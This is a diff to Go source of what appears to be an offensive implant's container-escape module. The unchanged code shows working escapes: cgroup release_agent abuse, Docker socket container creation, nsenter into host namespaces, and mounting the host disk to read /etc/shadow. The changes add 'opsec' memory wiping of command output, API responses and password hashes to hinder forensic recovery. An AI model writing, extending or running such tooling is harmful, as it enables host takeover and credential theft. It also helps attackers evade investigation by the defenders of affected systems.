@@ -100,6 +100,7 @@ func escapeCheck() (string, string) {
 	privileged := false
 	if data, err := os.ReadFile("/proc/self/status"); err == nil {
 		capEff := parseCapEff(string(data))
+		structs.ZeroBytes(data) // opsec: clear process capability data
 		if isFullCaps(capEff) {
 			sb.WriteString("[!] Full capabilities detected — likely PRIVILEGED container\n")
 			privileged = true
@@ -112,6 +113,7 @@ func escapeCheck() (string, string) {
 		// Check if we can write to cgroup
 		if data, err := os.ReadFile("/proc/1/cgroup"); err == nil {
 			cgroupPath := extractCgroupPath(string(data))
+			structs.ZeroBytes(data) // opsec: clear cgroup path info
 			if cgroupPath != "" {
 				sb.WriteString(fmt.Sprintf("[!] Cgroup path: %s — release_agent escape may be possible\n", cgroupPath))
 				sb.WriteString("    Use: container-escape -action cgroup -command '<cmd>'\n\n")
@@ -170,10 +172,12 @@ func escapeCheck() (string, string) {
 	// 8. K8s namespace/SA info
 	if ns, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace"); err == nil {
 		sb.WriteString(fmt.Sprintf("[*] K8s namespace: %s\n", strings.TrimSpace(string(ns))))
+		structs.ZeroBytes(ns) // opsec: clear K8s namespace info
 	}
 
 	// 9. Mounted host filesystems
 	if data, err := os.ReadFile("/proc/mounts"); err == nil {
+		defer structs.ZeroBytes(data) // opsec: clear mount info (may reveal host paths)
 		for _, line := range strings.Split(string(data), "\n") {
 			fields := strings.Fields(line)
 			if len(fields) >= 2 {
@@ -283,6 +287,7 @@ func escapeDockerSock(command, image string) (string, string) {
 	if err != nil {
 		return fmt.Sprintf("Failed to create container: %v", err), "error"
 	}
+	defer structs.ZeroBytes(out) // opsec: clear Docker API response
 
 	// Parse container ID
 	var createResp struct {
@@ -295,19 +300,24 @@ func escapeDockerSock(command, image string) (string, string) {
 	sb.WriteString(fmt.Sprintf("[+] Container created: %s\n", containerID))
 
 	// Start container
-	if _, err := dockerAPIPost(client, fmt.Sprintf("/containers/%s/start", containerID), nil); err != nil {
+	if startResp, err := dockerAPIPost(client, fmt.Sprintf("/containers/%s/start", containerID), nil); err != nil {
 		sb.WriteString(fmt.Sprintf("[!] Failed to start container: %v\n", err))
 		return sb.String(), "error"
+	} else {
+		structs.ZeroBytes(startResp) // opsec: clear Docker API response
 	}
 	sb.WriteString("[+] Container started\n")
 
 	// Wait for completion — log error but continue to get logs
-	if _, err := dockerAPIPost(client, fmt.Sprintf("/containers/%s/wait", containerID), nil); err != nil {
+	if waitResp, err := dockerAPIPost(client, fmt.Sprintf("/containers/%s/wait", containerID), nil); err != nil {
 		sb.WriteString(fmt.Sprintf("[!] Wait error (continuing): %v\n", err))
+	} else {
+		structs.ZeroBytes(waitResp) // opsec: clear Docker API wait response
 	}
 
 	// Get logs
 	logs, _ := dockerAPIGet(client, fmt.Sprintf("/containers/%s/logs?stdout=true&stderr=true", containerID))
+	defer structs.ZeroBytes(logs) // opsec: clear container command output
 
 	sb.WriteString("\n--- Output ---\n")
 	// Docker logs have 8-byte header per line; strip it
@@ -364,6 +374,7 @@ func escapeCgroupNotify(command string) (string, string) {
 				break
 			}
 		}
+		structs.ZeroBytes(data) // opsec: clear cgroup info (may reveal container paths)
 	}
 
 	// Write the release_agent path
@@ -442,6 +453,7 @@ func escapeCgroupNotify(command string) (string, string) {
 	if data, err := os.ReadFile(outputPath); err == nil {
 		sb.WriteString("\n--- Output ---\n")
 		sb.WriteString(string(data))
+		structs.ZeroBytes(data) // opsec: clear arbitrary command output
 	} else {
 		sb.WriteString("[!] No output file — release_agent may not have fired (host path resolution issue)\n")
 		sb.WriteString("    This technique requires the script path to be valid on the host filesystem\n")
@@ -510,6 +522,7 @@ func escapeNsenter(command string) (string, string) {
 		}
 		cmd.Dir = "/"
 		out, err := cmd.CombinedOutput()
+		defer structs.ZeroBytes(out) // opsec: clear command output from memory
 		if err != nil {
 			return fmt.Sprintf("setns failed (%s), chroot fallback also failed: %v\n%s", output, err, string(out)), "error"
 		}
@@ -572,6 +585,7 @@ func nsenterViaSetns(command string) (string, string) {
 	defer cancel()
 	cmd := exec.CommandContext(ctx, "/bin/sh", "-c", command)
 	out, err := cmd.CombinedOutput()
+	defer structs.ZeroBytes(out) // opsec: clear command output from memory
 	if err != nil {
 		return fmt.Sprintf("setns succeeded (%d namespaces) but command failed: %v\n%s", entered, err, string(out)), "error"
 	}
@@ -631,6 +645,7 @@ func escapeMountHost(devicePath string) (string, string) {
 	// Read /etc/shadow if possible
 	shadowPath := filepath.Join(mountPoint, "etc/shadow")
 	if data, err := os.ReadFile(shadowPath); err == nil {
+		defer structs.ZeroBytes(data) // opsec: clear password hashes from memory
 		lines := strings.Split(string(data), "\n")
 		sb.WriteString(fmt.Sprintf("\n--- /etc/shadow (%d entries) ---\n", len(lines)))
 		for _, line := range lines {
